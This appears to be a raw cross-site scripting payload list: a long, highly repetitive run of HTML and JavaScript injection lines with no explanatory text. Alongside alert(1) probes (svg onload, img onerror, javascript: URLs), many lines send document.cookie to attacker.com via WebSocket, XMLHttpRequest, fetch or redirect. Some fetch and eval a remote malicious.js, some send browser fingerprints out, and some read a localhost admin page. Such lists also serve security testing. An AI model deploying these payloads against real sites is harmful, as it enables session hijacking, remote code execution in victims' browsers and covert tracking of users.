<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
